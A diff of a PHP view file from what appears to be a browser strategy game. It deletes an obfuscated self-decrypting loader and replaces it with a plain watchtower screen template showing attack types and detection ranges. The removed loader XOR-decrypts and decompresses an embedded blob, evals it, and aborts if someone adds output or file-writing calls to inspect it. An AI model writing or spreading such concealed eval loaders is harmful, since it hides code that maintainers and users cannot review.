@@ -1,24 +1,126 @@
 <?php
-$erexxazght="0913064b5f3d5ad152a7a2a1b15b539c";
-$bjpjhjnw="090852000954550353510756025757080602040f57505903530451040c550153";
-$urxalwy="Qeu2a+QMuldyifthq18qpVeGAQFJz1XrGeX/OtXAFYosdENjKw/QwBh35kSFlHyKuA0tZ1rlnFEWo0hBcuSVsRphn8r3g6bu4bAuvPyC78q9vpPYPhwfGH9g1cY7uP+y6y1dAYOidw4JC+4pHSRCA+kzmSMcAzPEFGzb/jPwdXGzCROPkEIEqwQYVuEHrAKng0xPhfOoqN2nzLBn/HKfscqQc7F7IACvwLsMco88Lz6PC9OEjaSSpOLrDF43RjQ/Y+MvcoMJAs9X5A62xj49D4hV4d0YxUv4XDK52IZ4I6ofXVsvQwqF37OF/Vp1h6GsuSXceSgYXe9NheD627WKjA69502jNTnRIpK10UCNjAHGG2VL9LsMPS1g8KhUmYtlzmSsrAN/GcK+q/R3CR+T6upY0s5ULJw+rQz3KLSLwzN9hLEFnS/N8X6qlNNNc0PfWj3Zb7G9WAaYWlTrAttZeHDZOEQbkwXF+HbuvCW7tT1hcUK5pTBmiIkgoz+otliFak89ENpEQAMsRne2JhHKrOD0i20iEK5tHLxBnibr5Er/jVn5k9bO5B9IPinqnFHC8/on0gvPzRQDx5mJ1hmFgNcRTYsVaw/nOBR/VKbifnDWO43I4J1mZfYE11Na/BNs8WAuT7XpTUIf1SWXf0om879AixZeNuY08GSZJOTshlGvN0iH+am5hhGn4VykuqYRuWL/1rFtrfp/c3oreiArBvKv6jQy1CBltOcNzxaO00PED3YtMIkGIauxO5m+SvRCn/1Ap0BzuA2HnudtB6O1sYXulBcB+V2vUeYwX2IwwH6vkNSZnXYCHi5YAqXMOC2eoJ0VTmv9cRg6s3ojDSqQkoiTqpAhOXx7k5D5/MvTN3oMeBCbRaGqFst9iI6gkcVeQAzLeFQcQsQvbcuJ8xAQXAt3aqbBUoEdnCBD411cl9wy++r9AmQvItymhAuHEkMvttAsH1Vbe21mbX2gPfDPkTJVxbm4B8Zu25mRSN/Xw+h4lHUODcw6/rg1QrFO9N2lHTFGVU0yulz41skTYCliild6SiraDurKiJiculsv0yKu1EKQxspt3xjH7H2ihwSC9JIR54VdETzEemOGQP4LffG9SONTSGrAJlVHN5ZkshocwkqAbwN6nBnVfiV7cjlp+UOuEh4IR1Gy6zQoeZ6jmWGMAZSZHTpFazAcp8vCYFi4jrZLOB7M9KWqXCQEJ0ATyMAckxzd+kdOpp1Q5QruTVOyQ0tHQfdAsLEXpkkeeweWym3DYAnbgGxuWUfDamDLTmiKxlTSQL9cqhr3jDr3ZpeXEgeRBvqbOwR6IRXBsct8v4SyTxmjWWveAaF9KLfY6LsSWT5MjA7maJqsYKIJolY2sWL8ogXrA8PrscOX1o6jBdiJWUXO6v3L+QAnw1sy0uKAnsdwMDSViYRktRspyxIo5NfMD9Dr40R/6FSPjD0ehxftvzE8i9/qTgur72UlSF4uX1sanXn2DWY44rRxK8WfTo2X5ZDsURCSlUbRZwLVL77aHU4itf+BJ9jIjiQd7HJ6pGf7/6dBiJ9vxrtkh6qsCsTE7fXWvFaaz+LLmG03R6Q/hfswc8FHRHkAp4P21Gzm4pyhRu9kg5Wq6+wHgBEE/GGN8joqH3/+f0XXh40DhUuj2bwDYsBX2WRDliWOz8rsBQoc+064GVMoZIUsuffNMDxYqrIUvccgiMF4ykJVX6qLdaqgchYey/MRXnDHicHc1ilNCGvx";
-$voxibps=file_get_contents(__FILE__);
-$wzhhmaoxs=str_replace($urxalwy,"",$voxibps);
-if(strpos($wzhhmaoxs,"ec"."ho")!==false||strpos($wzhhmaoxs,"pr"."int")!==false||strpos($wzhhmaoxs,"var_"."dump")!==false||strpos($wzhhmaoxs,"file_put_"."contents")!==false||strpos($wzhhmaoxs,"fw"."rite")!==false){die();}
-$hnolyjjgz=str_replace(array($erexxazght,$bjpjhjnw),array("SP_3709a1ec","KP_c921880e"),$voxibps);
-$pjmvimdhgx=md5($hnolyjjgz);
-$okhobv=hex2bin($bjpjhjnw);
-$jrgyfp="";
-$unhtesqsv=strlen($pjmvimdhgx);
-for($vfklhpo=0;$vfklhpo<$unhtesqsv;$vfklhpo++){
-$jrgyfp.=chr(ord($okhobv[$vfklhpo])^ord($pjmvimdhgx[$vfklhpo]));
-}
-$jrgkfkrx=base64_decode($urxalwy);
-$iwxkylsene=strlen($jrgkfkrx);
-$eiwdbtx="";
-$buwsvg=strlen($jrgyfp);
-for($vfklhpo=0;$vfklhpo<$iwxkylsene;$vfklhpo++){
-$eiwdbtx.=$jrgkfkrx[$vfklhpo]^$jrgyfp[$vfklhpo%$buwsvg];
-}
-$gvsvvp="gzun"."compress";
-eval('?>' . $gvsvvp($eiwdbtx) . '<?php ');
+/**
+ * Watchtower Screen View
+ */
+?>
+<table>
+    <tr>
+        <td>
+            <img src="/graphic/big_buildings/watchtower1.png" title="Torre de vigia" alt="" />
+        </td>
+        <td>
+            <h2><?= __('screens.watchtower.title') ?> (<?= __('screens.main.level') ?> <?= $watchtower_level ?>)</h2>
+            <p><?= __('screens.watchtower.description') ?></p>
+        </td>
+    </tr>
+</table>
+
+<br>
+
+<table width="100%">
+    <tr>
+        <td valign="top" width="60%">
+            <!-- Ativa Info -->
+            <table class="vis" width="100%">
+                <tr>
+                    <th><?= __('screens.watchtower.active_title') ?></th>
+                </tr>
+                <tr>
+                    <td>
+                        <?= __('screens.watchtower.active_info_1') ?><br>
+                        <?= __('screens.watchtower.active_info_2') ?>
+                        <b><a href="help.php?mode=buildings#watchtower" target="_blank"><?= __('screens.watchtower.kb_link') ?></a></b>.
+                    </td>
+                </tr>
+            </table>
+
+            <br>
+            
+            <!-- Tipos de Informação -->
+            <table class="vis" width="100%">
+                <tr>
+                    <th colspan="2"><?= __('screens.watchtower.info_types_title') ?></th>
+                </tr>
+                <tr>
+                    <td width="20" align="center"><img src="/graphic/command/attack_small.webp" alt=""></td>
+                    <td><?= __('screens.watchtower.small_attack') ?> (1-1000 <?= __('screens.watchtower.troops') ?>)</td>
+                </tr>
+                <tr>
+                    <td align="center"><img src="/graphic/command/attack_medium.webp" alt=""></td>
+                    <td><?= __('screens.watchtower.medium_attack') ?> (1000-5000 <?= __('screens.watchtower.troops') ?>)</td>
+                </tr>
+                <tr>
+                    <td align="center"><img src="/graphic/command/attack_large.webp" alt=""></td>
+                    <td><?= __('screens.watchtower.large_attack') ?> (5000+ <?= __('screens.watchtower.troops') ?>)</td>
+                </tr>
+                <tr>
+                    <td align="center"><img src="/graphic/unit/unit_snob.png" alt=""></td>
+                    <td><?= __('screens.watchtower.with_noble') ?></td>
+                </tr>
+                <tr>
+                    <td align="center"><img align="right" src="/graphic/command/watchtower_all_seeing_eye.webp" alt=""><img align="left" src="/graphic/command/attack.webp" alt=""></td>
+                    <td><?= __('screens.watchtower.will_be_detected') ?></td>
+                </tr>
+            </table>
+        </td>
+        
+        <td valign="top" width="40%" style="padding-left:10px;">
+            <!-- Map View -->
+            <table class="vis" width="100%">
+                <tr>
+                    <th><?= __('screens.watchtower.map_view') ?></th>
+                </tr>
+                <tr>
+                    <td align="center" style="position:relative;">
+                        <div id="world-minimap" style="margin: 0 auto; width: 200px;"></div>
+                    </td>
+                </tr>
+            </table>
+
+            <script>
+                var isWatchtowerScreen = true;
+                var currentVillageId = <?= $village['id'] ?>;
+                var currentVillageX = <?= $village['x'] ?>;
+                var currentVillageY = <?= $village['y'] ?>;
+                var currentMapSize = 15; // default viewport size
+                
+                // Inject fake map data so minimap naturally renders the watchtower ring
+                window.mapData = {
+                    watchtower_circles: [
+                        { x: currentVillageX, y: currentVillageY, radius: <?= $detection_range ?> }
+                    ],
+                    faith_circles: []
+                };
+            </script>
+            <script src="/js/map_leaflet_combined.js?v=<?= file_exists(__DIR__ . '/../../../public/js/map_leaflet_combined.js') ? filemtime(__DIR__ . '/../../../public/js/map_leaflet_combined.js') : '1' ?>"></script>
+
+            <br>
+            
+            <!-- Ranges table -->
+            <table class="vis" width="100%">
+                <?php 
+                $ranges = [
+                    1 => 1.1, 2 => 1.3, 3 => 1.5, 4 => 1.7, 5 => 2.0,
+                    6 => 2.3, 7 => 2.6, 8 => 3.0, 9 => 3.4, 10 => 3.9,
+                    11 => 4.4, 12 => 5.1, 13 => 5.8, 14 => 6.7, 15 => 7.6,
+                    16 => 8.7, 17 => 10.0, 18 => 11.5, 19 => 13.1, 20 => 15.0
+                ];
+                
+                foreach ($ranges as $lvl => $range): ?>
+                <tr>
+                    <td <?= ($lvl == $watchtower_level) ? 'class="selected"' : '' ?>>
+                        <?= ($lvl == $watchtower_level) ? '<b>' : '' ?>
+                        <?= __('screens.main.level') ?> <?= $lvl ?>
+                        <?= ($lvl == $watchtower_level) ? '</b>' : '' ?>
+                    </td>
+                    <td <?= ($lvl == $watchtower_level) ? 'class="selected"' : '' ?>>
+                        <?= ($lvl == $watchtower_level) ? '<b>' : '' ?>
+                        <?= $range ?> <?= __('screens.watchtower.fields') ?>
+                        <?= ($lvl == $watchtower_level) ? '</b>' : '' ?>
+                    </td>
+                </tr>
+                <?php endforeach; ?>
+            </table>
+        </td>
+    </tr>
+</table>
